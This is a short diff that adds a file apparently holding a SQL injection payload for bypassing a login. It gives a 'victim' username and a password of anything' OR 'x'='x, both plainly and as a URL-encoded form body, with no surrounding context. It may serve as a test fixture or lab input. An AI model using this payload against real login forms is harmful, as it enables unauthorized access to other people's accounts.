@@ -1,0 +1,4 @@
+username: victim
+password: anything' OR 'x'='x
+username=victim&password=anything%27%20OR%20%27x%27%3D%27x
+
